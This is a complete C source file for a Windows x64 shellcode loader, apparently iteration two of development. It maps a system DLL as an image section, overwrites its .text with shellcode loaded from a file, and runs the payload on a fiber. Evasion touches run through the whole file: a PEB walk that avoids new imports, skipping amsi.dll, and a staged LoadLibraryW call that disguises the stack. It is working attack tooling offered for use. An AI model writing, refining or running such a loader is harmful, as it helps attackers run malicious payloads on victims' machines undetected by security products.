/*
 * calc_loader_iter2_fixed.c
 * x64 Windows shellcode loader — module stomping via SEC_IMAGE section mapping
 * + fiber execution. Iteration 2 (post-link-fix, path-generic).
 *
 * Fixes vs. previous iteration:
 *   - Removed the undefined EnumProcessModules_placeholder() call that caused
 *     LNK2019 / LNK1120.
 *   - Replaced the psapi.dll-based module enumeration with a self-contained
 *     PEB -> Ldr -> InMemoryOrderModuleList walk. No psapi import, no extra
 *     DLL load, no new IAT entry.
 *   - Hand-rolled PEB_LDR_DATA / LDR_DATA_TABLE_ENTRY (winternl.h does not
 *     define them on modern SDKs).
 *   - Path prefixes ("Program Files", "System32", "SysWOW64") are now derived
 *     at runtime via GetSystemDirectoryW / GetEnvironmentVariableW instead of
 *     being hardcoded to C:\... so the loader works on non-C: installs.
 *   - LDR FullDllName is copied through its Length (NUL-terminated) before
 *     being formatted into the NT path, avoiding reliance on the loader's
 *     incidental NUL termination.
 *
 * Build (MSVC):
 *   cl.exe /nologo /O2 /W3 calc_loader_iter2_fixed.c
 *
 * Run:
 *   calc_loader_iter2_fixed.exe C:\path\to\calc.bin
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>
#include <intrin.h>

/* ------------------------------------------------------------------ */
/* Manually declared NT types / prototypes (winternl.h is incomplete). */
/* ------------------------------------------------------------------ */

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct _UNICODE_STRING_LOCAL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_LOCAL;

typedef struct _OBJECT_ATTRIBUTES_LOCAL {
    ULONG           Length;
    HANDLE          RootDirectory;
    UNICODE_STRING_LOCAL *ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES_LOCAL;

typedef struct _IO_STATUS_BLOCK_LOCAL {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK_LOCAL;

/* Minimal PEB / Ldr structures for the InMemoryOrder walk. */
typedef struct _PEB_LDR_DATA_LOCAL {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_LOCAL;

typedef struct _LDR_DATA_TABLE_ENTRY_LOCAL {
    LIST_ENTRY          InLoadOrderLinks;
    LIST_ENTRY          InMemoryOrderLinks;
    LIST_ENTRY          InInitializationOrderLinks;
    PVOID               DllBase;
    PVOID               EntryPoint;
    ULONG               SizeOfImage;
    UNICODE_STRING_LOCAL FullDllName;
    UNICODE_STRING_LOCAL BaseDllName;
} LDR_DATA_TABLE_ENTRY_LOCAL;

typedef struct _PEB_LOCAL {
    BYTE                        Reserved1[2];
    BYTE                        BeingDebugged;
    BYTE                        Reserved2[1];
    PVOID                       Reserved3[2];
    PEB_LDR_DATA_LOCAL         *Ldr;
    /* ... rest not needed */
} PEB_LOCAL;

typedef NTSTATUS (NTAPI *pNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    OBJECT_ATTRIBUTES_LOCAL *ObjectAttributes,
    IO_STATUS_BLOCK_LOCAL *IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength);

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    OBJECT_ATTRIBUTES_LOCAL *ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    ULONG InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif
#ifndef ViewShare
#define ViewShare 1
#endif
#ifndef FILE_OPEN
#define FILE_OPEN 0x00000001
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000040
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

/* ------------------------------------------------------------------ */
/* Helpers                                                            */
/* ------------------------------------------------------------------ */

static void init_unicode_string(UNICODE_STRING_LOCAL *us, const wchar_t *s)
{
    size_t len = wcslen(s);
    us->Length        = (USHORT)(len * sizeof(wchar_t));
    us->MaximumLength = (USHORT)((len + 1) * sizeof(wchar_t));
    us->Buffer        = (PWSTR)s;
}

static void init_object_attributes(OBJECT_ATTRIBUTES_LOCAL *oa,
                                   UNICODE_STRING_LOCAL *name)
{
    oa->Length                   = sizeof(OBJECT_ATTRIBUTES_LOCAL);
    oa->RootDirectory            = NULL;
    oa->ObjectName               = name;
    oa->Attributes               = OBJ_CASE_INSENSITIVE;
    oa->SecurityDescriptor       = NULL;
    oa->SecurityQualityOfService = NULL;
}

static unsigned char *read_file_all(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;

    *out_size = 0;

    if (fopen_s(&fp, path, "rb") != 0 || fp == NULL) return NULL;
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = ftell(fp);
    if (sz <= 0) { fclose(fp); return NULL; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }
    buf = (unsigned char *)malloc((size_t)sz);
    if (buf == NULL) { fclose(fp); return NULL; }
    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf); fclose(fp); return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

/*
 * Case-insensitive prefix check for ASCII path strings.
 */
static int str_prefix_ci(const char *s, const char *prefix)
{
    while (*prefix) {
        char a = *s++;
        char b = *prefix++;
        if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
        if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
        if (a != b) return 0;
    }
    return 1;
}

/*
 * Case-insensitive substring search for ASCII (needle must be lowercase).
 */
static int str_contains_ci(const char *hay, const char *needle_lower)
{
    size_t nl = strlen(needle_lower);
    if (nl == 0) return 1;
    for (; *hay; hay++) {
        size_t i = 0;
        for (i = 0; i < nl; i++) {
            char a = hay[i];
            if (a == 0) return 0;
            if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
            if (a != needle_lower[i]) break;
        }
        if (i == nl) return 1;
    }
    return 0;
}

/*
 * Read the PEB pointer via GS:[0x60] (x64).
 */
static PEB_LOCAL *get_peb(void)
{
    return (PEB_LOCAL *)__readgsqword(0x60);
}

/*
 * Convert a LDR UNICODE_STRING (Length in bytes, may be non-NUL-terminated)
 * to a NUL-terminated ANSI string. Returns 1 on success.
 */
static int ldr_name_to_ansi(const UNICODE_STRING_LOCAL *us,
                            char *out, size_t out_cch)
{
    int n;
    if (us == NULL || us->Buffer == NULL || us->Length == 0) return 0;
    n = WideCharToMultiByte(CP_ACP, 0, us->Buffer,
                            us->Length / (int)sizeof(wchar_t),
                            out, (int)out_cch - 1, NULL, NULL);
    if (n <= 0) return 0;
    out[n] = '\0';
    return 1;
}

/*
 * Convert a LDR UNICODE_STRING to a NUL-terminated wide string.
 */
static int ldr_name_to_wchar(const UNICODE_STRING_LOCAL *us,
                             wchar_t *out, size_t out_cch)
{
    size_t wlen;
    if (us == NULL || us->Buffer == NULL || us->Length == 0) return 0;
    wlen = us->Length / sizeof(wchar_t);
    if (wlen + 1 > out_cch) wlen = out_cch - 1;
    wmemcpy(out, us->Buffer, wlen);
    out[wlen] = L'\0';
    return 1;
}

/*
 * Build a case-insensitive trailing "\\" -appended prefix from a directory
 * path. E.g. "c:\\windows\\system32" -> "c:\\windows\\system32\\".
 */
static void build_dir_prefix(char *out, size_t out_cch, const char *dir)
{
    size_t len = 0;
    if (out == NULL || out_cch < 2) return;
    out[0] = '\0';
    if (dir == NULL) return;
    len = strlen(dir);
    if (len + 2 > out_cch) return;
    memcpy(out, dir, len);
    if (len == 0 || out[len - 1] != '\\') {
        out[len] = '\\';
        out[len + 1] = '\0';
    } else {
        out[len] = '\0';
    }
}

/*
 * Discover a sacrificial DLL at runtime by walking the PEB Ldr lists.
 * Preference order:
 *   1) Any loaded module whose path begins with the Program Files directory
 *      (resolved at runtime).
 *   2) Any loaded module under System32 / SysWOW64 (resolved at runtime)
 *      that is NOT amsi.dll.
 *   3) Hard fallback: %SystemRoot%\System32\combase.dll.
 *
 * Writes the resulting NT-style path ("\??\C:\...") into out (wide).
 * Returns 1 on success, 0 on failure.
 */
static int pick_sacrificial_dll(wchar_t *out, size_t out_cch)
{
    PEB_LOCAL  *peb = NULL;
    PEB_LDR_DATA_LOCAL *ldr = NULL;
    LIST_ENTRY *head = NULL;
    LIST_ENTRY *cur  = NULL;
    wchar_t sysdir[MAX_PATH]  = {0};
    wchar_t pfdir[MAX_PATH]   = {0};
    wchar_t fallback[MAX_PATH] = {0};

    char sys_prefix[MAX_PATH] = {0};
    char pf_prefix[MAX_PATH]  = {0};

    if (out == NULL || out_cch < 8) return 0;
    out[0] = L'\0';

    /* Runtime-resolved System32 directory (never hardcode C:\...). */
    if (GetSystemDirectoryW(sysdir, MAX_PATH) == 0) {
        return 0;
    }
    _snwprintf_s(fallback, MAX_PATH, _TRUNCATE,
                 L"\\??\\%s\\combase.dll", sysdir);
    build_dir_prefix(sys_prefix, sizeof(sys_prefix), ""); /* placeholder */
    {
        char sysdir_a[MAX_PATH] = {0};
        WideCharToMultiByte(CP_ACP, 0, sysdir, -1,
                            sysdir_a, MAX_PATH - 1, NULL, NULL);
        build_dir_prefix(sys_prefix, sizeof(sys_prefix), sysdir_a);
    }

    /* Runtime-resolved Program Files directory. */
    if (GetEnvironmentVariableW(L"ProgramFiles", pfdir, MAX_PATH) == 0) {
        pfdir[0] = L'\0';
    } else {
        char pfdir_a[MAX_PATH] = {0};
        WideCharToMultiByte(CP_ACP, 0, pfdir, -1,
                            pfdir_a, MAX_PATH - 1, NULL, NULL);
        build_dir_prefix(pf_prefix, sizeof(pf_prefix), pfdir_a);
    }

    peb = get_peb();
    if (peb == NULL || peb->Ldr == NULL) {
        wcsncpy_s(out, out_cch, fallback, _TRUNCATE);
        return 1;
    }
    ldr  = peb->Ldr;
    head = &ldr->InMemoryOrderModuleList;
    cur  = head->Flink;

    /* Pass 1: prefer a module under Program Files (if we resolved the dir). */
    if (pf_prefix[0] != '\0') {
        while (cur != NULL && cur != head) {
            LDR_DATA_TABLE_ENTRY_LOCAL *e =
                CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY_LOCAL, InMemoryOrderLinks);

            char apath[MAX_PATH] = {0};
            wchar_t wpath[MAX_PATH] = {0};

            if (ldr_name_to_ansi(&e->FullDllName, apath, sizeof(apath)) &&
                str_prefix_ci(apath, pf_prefix) &&
                ldr_name_to_wchar(&e->FullDllName, wpath, MAX_PATH)) {
                _snwprintf_s(out, out_cch, _TRUNCATE, L"\\??\\%s", wpath);
                return 1;
            }
            cur = cur->Flink;
        }
    }

    /* Pass 2: any System32 / SysWOW64 DLL that is not amsi.dll. */
    if (sys_prefix[0] != '\0') {
        cur = head->Flink;
        while (cur != NULL && cur != head) {
            LDR_DATA_TABLE_ENTRY_LOCAL *e =
                CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY_LOCAL, InMemoryOrderLinks);

            char apath[MAX_PATH] = {0};
            wchar_t wpath[MAX_PATH] = {0};

            if (ldr_name_to_ansi(&e->FullDllName, apath, sizeof(apath)) &&
                str_prefix_ci(apath, sys_prefix)) {
                if (str_contains_ci(apath, "amsi.dll")) {
                    cur = cur->Flink;
                    continue;
                }
                if (ldr_name_to_wchar(&e->FullDllName, wpath, MAX_PATH)) {
                    _snwprintf_s(out, out_cch, _TRUNCATE, L"\\??\\%s", wpath);
                    return 1;
                }
            }
            cur = cur->Flink;
        }
    }

    /* Pass 3: hard fallback (System32\combase.dll, resolved above). */
    wcsncpy_s(out, out_cch, fallback, _TRUNCATE);
    return 1;
}

/*
 * Locate the raw bytes of the .text section inside a mapped PE image.
 * Fully bounds-checked against SizeOfImage / SizeOfRawData.
 */
static unsigned char *find_text_section(unsigned char *base,
                                        size_t view_size,
                                        size_t *out_size)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt  = NULL;
    IMAGE_SECTION_HEADER *sec = NULL;
    WORD i = 0;
    DWORD size_of_image = 0;
    WORD  num_sections  = 0;
    size_t e_lfanew = 0;

    *out_size = 0;

    if (view_size < sizeof(IMAGE_DOS_HEADER)) return NULL;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    e_lfanew = (size_t)dos->e_lfanew;
    if (e_lfanew + sizeof(IMAGE_NT_HEADERS) > view_size) return NULL;
    nt = (IMAGE_NT_HEADERS *)(base + e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return NULL;

    size_of_image = nt->OptionalHeader.SizeOfImage;
    num_sections  = nt->FileHeader.NumberOfSections;

    if (size_of_image == 0 || size_of_image > view_size) return NULL;

    sec = IMAGE_FIRST_SECTION(nt);
    if ((size_t)((unsigned char *)sec - base) +
            (size_t)num_sections * sizeof(IMAGE_SECTION_HEADER) > view_size) {
        return NULL;
    }

    for (i = 0; i < num_sections; i++) {
        size_t va  = (size_t)sec[i].VirtualAddress;
        size_t raw = (size_t)sec[i].SizeOfRawData;
        size_t vsz = (size_t)sec[i].Misc.VirtualSize;

        if (memcmp(sec[i].Name, ".text", 5) != 0) continue;
        if (raw == 0) return NULL;
        if (va >= size_of_image) return NULL;
        if (va + raw > size_of_image) return NULL;
        if (va + raw > view_size) return NULL;
        if (vsz != 0 && vsz < raw) raw = vsz;
        if (raw == 0) return NULL;

        *out_size = raw;
        return base + va;
    }
    return NULL;
}

/* ------------------------------------------------------------------ */
/* Fiber entry                                                        */
/* ------------------------------------------------------------------ */

typedef struct _FIBER_CTX {
    void *payload;
} FIBER_CTX;

static VOID CALLBACK fiber_entry(LPVOID param)
{
    FIBER_CTX *ctx = (FIBER_CTX *)param;
    void (*fn)(void) = (void (*)(void))ctx->payload;
    fn();
    ExitProcess(0);
}

/* ------------------------------------------------------------------ */
/* main                                                               */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    unsigned char *shellcode = NULL;
    size_t         shellcode_size = 0;

    HMODULE hNtdll = NULL;
    pNtCreateFile        NtCreateFile        = NULL;
    pNtCreateSection     NtCreateSection     = NULL;
    pNtMapViewOfSection  NtMapViewOfSection  = NULL;
    pNtClose             NtClose             = NULL;

    wchar_t target_dll[MAX_PATH] = {0};

    UNICODE_STRING_LOCAL    us;
    OBJECT_ATTRIBUTES_LOCAL oa;
    IO_STATUS_BLOCK_LOCAL   iosb;
    HANDLE  hFile = NULL;
    HANDLE  hSec  = NULL;
    NTSTATUS st   = 0;

    PVOID   view_base = NULL;
    SIZE_T  view_size = 0;

    unsigned char *text = NULL;
    size_t         text_size = 0;
    size_t         write_size = 0;

    DWORD   old_prot = 0;
    FIBER_CTX ctx;
    LPVOID  main_fiber = NULL;
    LPVOID  pay_fiber  = NULL;

    SYSTEM_INFO si;
    size_t page = 0x1000;
    uintptr_t prot_start = 0;
    size_t    prot_len   = 0;
    uintptr_t text_start = 0;
    uintptr_t text_end   = 0;

    HMODULE hHelper = NULL;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    /* 1. Read shellcode. */
    shellcode = read_file_all(argv[1], &shellcode_size);
    if (shellcode == NULL || shellcode_size == 0) {
        fprintf(stderr, "[-] failed to read payload: %s\n", argv[1]);
        return 1;
    }
    printf("[+] payload: %s (%zu bytes)\n", argv[1], shellcode_size);

    /* 2. Resolve NT APIs. */
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        fprintf(stderr, "[-] GetModuleHandleA(ntdll) failed\n");
        free(shellcode);
        return 1;
    }
    NtCreateFile       = (pNtCreateFile)      GetProcAddress(hNtdll, "NtCreateFile");
    NtCreateSection    = (pNtCreateSection)   GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtClose            = (pNtClose)           GetProcAddress(hNtdll, "NtClose");

    if (!NtCreateFile || !NtCreateSection || !NtMapViewOfSection || !NtClose) {
        fprintf(stderr, "[-] failed to resolve NT APIs\n");
        free(shellcode);
        return 1;
    }

    /* 3. Choose a sacrificial DLL at runtime (PEB walk; no psapi). */
    if (!pick_sacrificial_dll(target_dll, MAX_PATH)) {
        fprintf(stderr, "[-] could not select a sacrificial DLL\n");
        free(shellcode);
        return 1;
    }
    printf("[+] sacrificial DLL: %ls\n", target_dll);

    /* 4. Open the sacrificial DLL. */
    init_unicode_string(&us, target_dll);
    init_object_attributes(&oa, &us);
    memset(&iosb, 0, sizeof(iosb));

    st = NtCreateFile(
            &hFile,
            FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
            &oa,
            &iosb,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateFile failed: 0x%08lX\n", (unsigned long)st);
        free(shellcode);
        return 1;
    }

    /* 5. Create a file-backed image section. */
    st = NtCreateSection(
            &hSec,
            SECTION_MAP_READ | SECTION_MAP_EXECUTE,
            NULL,
            NULL,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n", (unsigned long)st);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    /* 6. Map the image into our own process. */
    view_size = 0;
    st = NtMapViewOfSection(
            hSec,
            GetCurrentProcess(),
            &view_base,
            0,
            0,
            NULL,
            &view_size,
            ViewShare,
            0,
            PAGE_READONLY);
    if (!NT_SUCCESS(st) || view_base == NULL || view_size == 0) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n", (unsigned long)st);
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }
    printf("[+] mapped image @ %p (view size = %zu)\n", view_base, (size_t)view_size);

    /* 7. Locate .text. */
    text = find_text_section((unsigned char *)view_base, (size_t)view_size,
                             &text_size);
    if (text == NULL || text_size == 0) {
        fprintf(stderr, "[-] .text not found or invalid in mapped image\n");
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    if (shellcode_size > text_size) {
        fprintf(stderr, "[-] payload (%zu) > .text raw size (%zu)\n",
                shellcode_size, text_size);
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }
    write_size = shellcode_size;

    /* 8. Compute page-aligned protect span, clipped to the .text raw extent. */
    GetSystemInfo(&si);
    if (si.dwPageSize != 0) page = (size_t)si.dwPageSize;

    text_start = (uintptr_t)text;
    text_end   = text_start + write_size;

    prot_start = text_start & ~(uintptr_t)(page - 1);

    {
        uintptr_t text_raw_end = text_start + text_size;
        uintptr_t prot_end     = (text_end + page - 1) & ~(uintptr_t)(page - 1);
        uintptr_t raw_end_aln  = (text_raw_end + page - 1) & ~(uintptr_t)(page - 1);

        if (prot_end > raw_end_aln) prot_end = raw_end_aln;
        if (prot_end <= prot_start) {
            fprintf(stderr, "[-] computed protect span is empty\n");
            NtClose(hSec);
            NtClose(hFile);
            free(shellcode);
            return 1;
        }
        prot_len = (size_t)(prot_end - prot_start);
    }

    printf("[+] .text raw @ %p (size=%zu), protecting %zu bytes @ %p\n",
           (void *)text, text_size, prot_len, (void *)prot_start);

    /* 9. Load a benign resident DLL so a LoadLibraryW frame is on the stack. */
    hHelper = LoadLibraryW(L"kernelbase.dll");
    if (hHelper == NULL) {
        fprintf(stderr, "[-] LoadLibraryW(kernelbase) failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    if (!VirtualProtect((LPVOID)prot_start, prot_len, PAGE_READWRITE, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RW) failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    memcpy(text, shellcode, write_size);

    if (!VirtualProtect((LPVOID)prot_start, prot_len, PAGE_EXECUTE_READ, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RX) failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    free(shellcode);
    shellcode = NULL;

    /* 10. Execute via fiber. */
    ctx.payload = (void *)text;

    main_fiber = ConvertThreadToFiber(NULL);
    if (main_fiber == NULL) {
        fprintf(stderr, "[-] ConvertThreadToFiber failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        return 1;
    }
    pay_fiber = CreateFiber(0, fiber_entry, &ctx);
    if (pay_fiber == NULL) {
        fprintf(stderr, "[-] CreateFiber failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        return 1;
    }

    printf("[+] switching to payload fiber @ %p\n", (void *)text);
    SwitchToFiber(pay_fiber);

    NtClose(hSec);
    NtClose(hFile);
    return 0;
}